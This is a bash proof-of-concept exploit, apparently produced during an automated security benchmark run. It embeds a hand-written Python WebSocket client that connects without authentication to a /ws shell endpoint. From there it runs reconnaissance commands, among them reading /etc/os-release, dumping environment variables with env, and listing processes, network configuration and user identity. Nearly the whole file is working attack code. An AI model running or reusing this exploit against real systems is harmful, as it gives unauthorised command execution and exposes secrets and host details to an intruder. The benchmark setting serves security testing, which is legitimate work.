#!/bin/bash
# POC: Demonstrates sensitive system information disclosure via unauthenticated WebSocket shell access using Python WebSocket client
# Target: ./repo
# Created: 2025-11-04T17:15:58.055Z
# Session: benchmark-XBEN-023-24-mhktion0

# WebSocket Information Disclosure POC - Version 2
# Demonstrates retrieval of sensitive system information via unauthenticated WebSocket access
# Uses Python for WebSocket client implementation

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-8080}"
WS_URL="ws://${TARGET_HOST}:${TARGET_PORT}/ws"

echo "[*] WebSocket Information Disclosure POC"
echo "[*] Target: $WS_URL"
echo ""

# Check if Python is available
if ! command -v python3 &> /dev/null; then
    echo "[-] Python3 is required but not found"
    exit 1
fi

# Create Python WebSocket client
PYTHON_SCRIPT=$(cat << 'EOFPYTHON'
import sys
import socket
import base64
import hashlib
from struct import pack

def create_websocket_key():
    return base64.b64encode(b"daytona-security-poc").decode()

def send_frame(sock, data):
    """Send WebSocket frame with text data"""
    payload = data.encode('utf-8')
    payload_len = len(payload)
    
    # Frame format: opcode=1 (text), mask=1, payload_len, masking_key, masked_payload
    frame = bytearray()
    frame.append(0x81)  # FIN + text opcode
    
    if payload_len < 126:
        frame.append(0x80 | payload_len)  # Mask bit set + length
    elif payload_len < 65536:
        frame.append(0xfe)  # Extended 16-bit length
        frame.extend(pack('>H', payload_len))
    else:
        frame.append(0xff)  # Extended 64-bit length
        frame.extend(pack('>Q', payload_len))
    
    # Add masking key
    import os
    mask = os.urandom(4)
    frame.extend(mask)
    
    # Mask payload
    masked_payload = bytearray()
    for i, byte in enumerate(payload):
        masked_payload.append(byte ^ mask[i % 4])
    
    frame.extend(masked_payload)
    sock.send(bytes(frame))

def receive_frame(sock):
    """Receive WebSocket frame"""
    data = b''
    try:
        # Receive first 2 bytes (opcode + length)
        header = sock.recv(2)
        if len(header) < 2:
            return None
        
        opcode = header[0] & 0x0f
        payload_len = header[1] & 0x7f
        
        if payload_len == 126:
            payload_len = int.from_bytes(sock.recv(2), 'big')
        elif payload_len == 127:
            payload_len = int.from_bytes(sock.recv(8), 'big')
        
        # Server frames are not masked
        payload = sock.recv(payload_len)
        return payload.decode('utf-8', errors='ignore')
    except:
        return None

def exploit_websocket(host, port, commands):
    try:
        print(f"[*] Connecting to {host}:{port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        # Send WebSocket upgrade request
        ws_key = create_websocket_key()
        upgrade_request = (
            f"GET /ws HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {ws_key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"\r\n"
        )
        
        sock.send(upgrade_request.encode())
        
        # Receive upgrade response
        response = b''
        while b'\r\n\r\n' not in response:
            chunk = sock.recv(1024)
            if not chunk:
                print("[-] Connection closed")
                return False
            response += chunk
        
        if b'101' not in response[:100]:
            print("[-] WebSocket upgrade failed")
            print("[-] Response:", response.decode('utf-8', errors='ignore')[:200])
            return False
        
        print("[+] WebSocket connection established")
        print("")
        
        # Send commands and retrieve information
        for command, description in commands:
            print(f"[*] {description}")
            print(f"    Command: {command}")
            
            send_frame(sock, command)
            
            # Receive response
            output = receive_frame(sock)
            if output:
                print(f"    Response:")
                for line in output.split('\n')[:15]:
                    if line.strip():
                        print(f"        {line}")
            else:
                print("    [!] No response received")
            
            print("")
        
        sock.close()
        print("[+] POC Execution Complete")
        print("[*] Summary: Unauthenticated WebSocket access allows arbitrary command execution")
        print("[*] Impact: Complete system information disclosure for reconnaissance")
        return True
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    
    commands = [
        ("cat /etc/os-release", "Retrieving OS Information"),
        ("cat /etc/hostname", "Retrieving System Hostname"),
        ("ip addr", "Retrieving Network Configuration"),
        ("ps aux | head -5", "Retrieving Process Information"),
        ("env | head -10", "Retrieving Environment Variables"),
        ("whoami", "Retrieving Current User"),
        ("uname -a", "Retrieving System Information"),
        ("id", "Retrieving User ID Information"),
    ]
    
    exploit_websocket(host, port, commands)
EOFPYTHON
)

# Save and execute Python script
TEMP_SCRIPT="/tmp/websocket_exploit_$$.py"
echo "$PYTHON_SCRIPT" > "$TEMP_SCRIPT"

python3 "$TEMP_SCRIPT" "$TARGET_HOST" "$TARGET_PORT"
RESULT=$?

rm -f "$TEMP_SCRIPT"

exit $RESULT